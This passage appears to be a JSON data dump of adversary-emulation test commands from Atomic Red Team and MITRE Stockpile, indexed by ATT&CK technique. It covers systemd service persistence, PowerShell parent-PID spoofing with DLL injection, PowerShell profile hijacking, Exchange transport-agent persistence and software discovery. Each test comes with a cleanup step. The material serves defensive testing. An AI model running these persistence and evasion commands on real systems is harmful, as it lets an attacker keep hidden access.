\"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/art-systemd-service.service\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/art-systemd-service.service\necho \"\" >> #{systemd_service_path}/art-systemd-service.service\necho \"[Service]\" >> #{systemd_service_path}/art-systemd-service.service\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"\" >> #{systemd_service_path}/art-systemd-service.service\necho \"[Install]\" >> #{systemd_service_path}/art-systemd-service.service\necho \"WantedBy=default.target\" >> #{systemd_service_path}/art-systemd-service.service\nsystemctl daemon-reload\nsystemctl enable art-systemd-service.service\nsystemctl start art-systemd-service.service\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > /etc/systemd/system/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Service]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Install]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"WantedBy=default.target\" >> /etc/systemd/system/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > /etc/systemd/system/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Service]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Install]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"WantedBy=default.target\" >> /etc/systemd/system/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}], "command_list": ["echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/art-systemd-service.service\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/art-systemd-service.service\necho \"\" >> #{systemd_service_path}/art-systemd-service.service\necho \"[Service]\" >> #{systemd_service_path}/art-systemd-service.service\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"\" >> #{systemd_service_path}/art-systemd-service.service\necho \"[Install]\" >> #{systemd_service_path}/art-systemd-service.service\necho \"WantedBy=default.target\" >> #{systemd_service_path}/art-systemd-service.service\nsystemctl daemon-reload\nsystemctl enable art-systemd-service.service\nsystemctl start art-systemd-service.service\n", "echo \"[Unit]\" > /etc/systemd/system/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Service]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Install]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"WantedBy=default.target\" >> /etc/systemd/system/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > /etc/systemd/system/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Service]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Install]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"WantedBy=default.target\" >> /etc/systemd/system/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n"], "technique_id": "T1501", "parsed_datasets": [{"Atomic Red Team Test - Systemd Service": {"display_name": "Systemd Service", "atomic_tests": [{"description": "This test creates a Systemd service unit file and enables it as a service.\n", "supported_platforms": ["linux"], "name": "Create Systemd Service", "input_arguments": {"execstartpre_action": {"default": "/bin/touch /tmp/art-systemd-execstartpre-marker", "type": "String", "description": "ExecStartPre action for Systemd service"}, "execstoppost_action": {"default": "/bin/touch /tmp/art-systemd-execstoppost-marker", "type": "String", "description": "ExecStopPost action for Systemd service"}, "execreload_action": {"default": "/bin/touch /tmp/art-systemd-execreload-marker", "type": "String", "description": "ExecReload action for Systemd service"}, "execstop_action": {"default": "/bin/touch /tmp/art-systemd-execstop-marker", "type": "String", "description": "ExecStop action for Systemd service"}, "execstartpost_action": {"default": "/bin/touch /tmp/art-systemd-execstartpost-marker", "type": "String", "description": "ExecStartPost action for Systemd service"}, "systemd_service_file": {"default": "art-systemd-service.service", "type": "String", "description": "File name of systemd service unit file"}, "systemd_service_path": {"default": "/etc/systemd/system", "type": "Path", "description": "Path to systemd service unit file"}, "execstart_action": {"default": "/bin/touch /tmp/art-systemd-execstart-marker", "type": "String", "description": "ExecStart action for Systemd service"}}, "executor": {"command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": "bash", "cleanup_command": "systemctl stop #{systemd_service_file}\nsystemctl disable #{systemd_service_file}\nrm -rf #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\n"}}], "attack_technique": "T1501"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "name": null}, {"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -dllpath \"#{dll_path}\"\n", "name": null}, {"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "name": null}, {"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"PathToAtomicsFolder\\T1502\\bin\\calc.dll\"\n", "name": null}, {"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process explorer | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "name": null}], "command_list": [". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -dllpath \"#{dll_path}\"\n", ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"PathToAtomicsFolder\\T1502\\bin\\calc.dll\"\n", ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process explorer | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n"], "technique_id": "T1502", "parsed_datasets": [{"Atomic Red Team Test - Parent PID Spoofing": {"display_name": "Parent PID Spoofing", "atomic_tests": [{"dependencies": [{"description": "DLL to inject must exist on disk at specified location (#{dll_path})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1502/bin/calc.dll\" -OutFile \"#{dll_path}\"\n", "prereq_command": "if (Test-Path #{dll_path}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Parent PID Spoofing using PowerShell", "executor": {"elevation_required": false, "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "name": "powershell", "cleanup_command": "Stop-Process -Name \"#{dll_process_name}\" -ErrorAction Ignore\nStop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n"}, "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n", "input_arguments": {"dll_process_name": {"default": "calculator", "type": "string", "description": "Name of the created process from the injected dll"}, "spawnto_process_path": {"default": "C:\\Program Files\\Internet Explorer\\iexplore.exe", "type": "string", "description": "Path of the process to spawn"}, "spawnto_process_name": {"default": "iexplore", "type": "string", "description": "Name of the process to spawn"}, "dll_path": {"default": "PathToAtomicsFolder\\T1502\\bin\\calc.dll", "type": "string", "description": "Path of the dll to inject"}, "parent_process_name": {"default": "explorer", "type": "string", "description": "Name of the parent process"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1502"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1504/T1504.yaml", "command": "if(Test-Path #{ps_profile}){\n}\nelse{\n  New-Item -Path #{ps_profile} -Type File -Force\n}\n$malicious = \"Start-Process calc.exe\"\nAdd-Content #{ps_profile} -Value $malicious\npowershell -command exit\n", "name": null}, {"source": "atomics/T1504/T1504.yaml", "command": "if(Test-Path $profile){\n}\nelse{\n  New-Item -Path $profile -Type File -Force\n}\n$malicious = \"Start-Process calc.exe\"\nAdd-Content $profile -Value $malicious\npowershell -command exit\n", "name": null}], "command_list": ["if(Test-Path #{ps_profile}){\n}\nelse{\n  New-Item -Path #{ps_profile} -Type File -Force\n}\n$malicious = \"Start-Process calc.exe\"\nAdd-Content #{ps_profile} -Value $malicious\npowershell -command exit\n", "if(Test-Path $profile){\n}\nelse{\n  New-Item -Path $profile -Type File -Force\n}\n$malicious = \"Start-Process calc.exe\"\nAdd-Content $profile -Value $malicious\npowershell -command exit\n"], "technique_id": "T1504", "parsed_datasets": [{"Atomic Red Team Test - PowerShell Profile": {"display_name": "PowerShell Profile", "atomic_tests": [{"description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable\n", "supported_platforms": ["windows"], "name": "Append malicious start-process cmdlet", "input_arguments": {"exe_path": {"default": "calc.exe", "type": "Path", "description": "Path the malicious executable"}, "ps_profile": {"default": "$profile", "type": "String", "description": "Powershell profile to use"}}, "executor": {"elevation_required": false, "command": "if(Test-Path #{ps_profile}){\n}\nelse{\n  New-Item -Path #{ps_profile} -Type File -Force\n}\n$malicious = \"Start-Process #{exe_path}\"\nAdd-Content #{ps_profile} -Value $malicious\npowershell -command exit\n", "name": "powershell", "cleanup_command": "$oldprofile = cat $profile | Select-Object -skiplast 1\nSet-Content $profile -Value $oldprofile"}}], "attack_technique": "T1504"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1505/T1505.yaml", "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent Security Interop Agent\nGet-TransportAgent | Format-List Name,Enabled\n", "name": null}, {"source": "atomics/T1505/T1505.yaml", "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath #{dll_path}\nEnable-TransportAgent Security Interop Agent\nGet-TransportAgent | Format-List Name,Enabled\n", "name": null}, {"source": "atomics/T1505/T1505.yaml", "command": "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n", "name": null}], "command_list": ["Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent Security Interop Agent\nGet-TransportAgent | Format-List Name,Enabled\n", "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath #{dll_path}\nEnable-TransportAgent Security Interop Agent\nGet-TransportAgent | Format-List Name,Enabled\n", "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n"], "technique_id": "T1505", "parsed_datasets": [{"Atomic Red Team Test - Server Software Component": {"display_name": "Server Software Component", "atomic_tests": [{"dependencies": [{"description": "Microsoft Exchange SnapIn must be installed\n", "get_prereq_command": "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn\n", "prereq_command": "Get-TransportAgent -TransportService FrontEnd\n"}], "supported_platforms": ["windows"], "name": "Install MS Exchange Transport Agent Persistence", "executor": {"elevation_required": true, "command": "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n", "name": "powershell", "cleanup_command": "Disable-TransportAgent #{transport_agent_identity}\nUninstall-TransportAgent #{transport_agent_identity}\nGet-TransportAgent\n"}, "input_arguments": {"transport_agent_identity": {"default": "Security Interop Agent", "type": "string", "description": "Friendly name of transport agent once installed."}, "class_factory": {"default": "Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory", "type": "string", "description": "Class factory of transport agent."}, "dll_path": {"default": "c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll", "type": "path", "description": "Path of DLL to use as transport agent."}}, "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n"}], "attack_technique": "T1505"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1518/T1518.yaml", "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n", "name": null}, {"source": "atomics/T1518/T1518.yaml", "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n", "name": null}, {"source": "data/abilities/discovery/c9be8043-a445-4cbf-b77b-ed7bb007fc7c.yml", "command": {"windows": {"psh": {"command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"}}}, "name": "Determine the version of Internet Explorer running"}], "command_list": ["reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n", "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n", {"windows": {"psh": {"command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"}}}], "technique_id": "T1518", "parsed_datasets": [{"Atomic Red Team Test - Software Discovery": {"display_name": "Software Discovery", "atomic_tests": [{"description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n", "supported_platforms": ["windows"], "name": "Find and Display Internet Explorer Browser Version", "executor": {"elevation_required": false, "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n", "name": "command_prompt"}}, {"description": "Adversaries may attempt to get a listing of all software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n", "supported_platforms": ["windows"], "name": "Applications Installed", "executor": {"elevation_required": false, "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n", "name": "powershell"}}], "attack_technique": "T1518"}}, {"Mitre Stockpile - Determine the version of Internet Explorer running": {"platforms": {"windows": {"psh": {"command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"}}}, "description": "Determine the version of Internet Explorer running", "tactic": "discovery", "technique": {"attack_id": "T1518", "name": "Software Discovery"}, "id": "c9be8043-a445-4cbf-b77b-ed7bb007fc7c", "name": "Internet Explorer Version"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1519/T1519.yaml", "command": "sudo cp \"PathToAtomicsFolder/T1519/src/T1519_emond.plist\" /etc/emond.d/rules/T1519_emond.plist\nsudo touch 